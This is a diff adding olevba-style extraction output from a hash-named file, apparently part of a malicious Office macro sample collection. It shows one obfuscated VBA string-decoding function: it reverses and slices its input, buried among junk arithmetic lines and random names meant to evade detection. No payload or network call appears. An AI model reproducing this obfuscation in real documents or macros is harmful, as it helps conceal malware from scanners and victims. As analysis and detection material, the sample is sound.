@@ -1,0 +1,21 @@
+Filename     : ./macros/9fa331b74d27fd86d89c22d4d44336fe6ecb5811022e580cce48ad96d291d9b2
+OLE stream   : Macros/VBA/EihuSHHcXREr
+VBA filename : EihuSHHcXREr.bas
+----------------------------------------
+Attribute VB_Name = "EihuSHHcXREr"
+Function gBKJjk3vhjVKsdasdsadasdads(ByVal iHFAzUYiKY As String, zMUjTid, SSkocnqomiVv)
+On Error Resume Next
+jIWOTwjKW = NOnah * twTDc / QZKM - Round(1741369 * CSng(2489123 * CInt(IOpNZq)) + lTfZ - Round(dLXRTH)) - 544 / ZpjawB + XswE / Rnd(pTaN) * (3459082 / CDbl(4605672) + (NkUf / CByte(5002940 / CDbl(3379828) - 8948174 / 2906466)))
+hbEjLOzIDtZH = AtIrFQmuZorMKS + (iHFAzUYiKY) + oOYjUDzFt
+StIFJJJDm = XznN * Yjfo / joDRz - Round(8299013 * CSng(2222332 * CInt(LuwCnP)) + LIhlP - Round(nauvV)) - 544 / AWKo + JbMdq / Rnd(GSzQsr) * (3702907 / CDbl(3923420) + (YoqQ / CByte(9862520 / CDbl(8906327) - 4719884 / 9829055)))
+tOIVdqKWA = YtMD * URbSSO / ibbJcL - Round(6263049 * CSng(8837944 * CInt(dkcSPh)) + ccntr - Round(uazUuV)) - 544 / YbGkwf + uTNwp / Rnd(RvIk) * (7088001 / CDbl(5944488) + (vwqfVD / CByte(9449978 / CDbl(6309919) - 85279 / 2083616)))
+wpjBpNUbPLn = RLvQBi + StrReverse(hbEjLOzIDtZH) + UkAbIOoDkTzSO
+jPiCZlbPv = AtJFh * LAtis / umUp - Round(5228496 * CSng(8244159 * CInt(Sdhi)) + YCdsqP - Round(cYBA)) - 544 / zJHZZ + GnWTU / Rnd(ijKkwd) * (1026791 / CDbl(3689366) + (MjiB / CByte(3798882 / CDbl(1950021) - 5650834 / 5179934)))
+QrtmmqRjr = KauaFh * JGFTi / whWmdc - Round(4592973 * CSng(1036323 * CInt(cMFb)) + JwttA - Round(jvsQ)) - 544 / bzUKDX + lwzE / Rnd(DoHT) * (7647036 / CDbl(239686) + (hUiGXN / CByte(2610425 / CDbl(2380954) - 3592226 / 4539175)))
+fgyVHJgvahkjsbkj = BoFzBfD + Mid(wpjBpNUbPLn, zMUjTid, SSkocnqomiVv) + FFFUiiEjpEtmwt
+ujSwqwwpL = OkwQKE * cQsvsc / zcTh - Round(4635671 * CSng(1470549 * CInt(kPHtW)) + EoHwQ - Round(QFuioV)) - 544 / SRWDwC + SzOd / Rnd(RDPd) * (3978110 / CDbl(7894281) + (nXhoI / CByte(8949628 / CDbl(6049405) - 9830448 / 2349541)))
+uFuiLmpIN = IrPO * Zdiw / AcZsSi - Round(2746616 * CSng(7047278 * CInt(NISCu)) + sUwEi - Round(HPIj)) - 544 / YIZOf + jJLR / Rnd(BMdYE) * (5996945 / CDbl(4828) + (poUq / CByte(3002192 / CDbl(925848) - 5947195 / 5802839)))
+gBKJjk3vhjVKsdasdsadasdads = btMRMoJF + fgyVHJgvahkjsbkj + OiwmtiG
+MTmaGJcPF = pDSKJA * NiSFO / YTStQR - Round(1251474 * CSng(699242 * CInt(ljClsD)) + RQzM - Round(wGnAE)) - 544 / OZLQBw + OHnPL / Rnd(wntRiH) * (4701665 / CDbl(1527460) + (zQBHB / CByte(3593234 / CDbl(4855456) - 2553056 / 6052113)))
+tMirikViE = dvaB * wNiE / EtjakZ - Round(8949792 * CSng(2836972 * CInt(wMpuHW)) + QHIJwA - Round(RiiZ)) - 544 / wJoj + YbAjH / Rnd(FpGo) * (1416417 / CDbl(8929116) + (BSfGiG / CByte(5073191 / CDbl(9062355) - 8532483 / 731215)))
+End Function
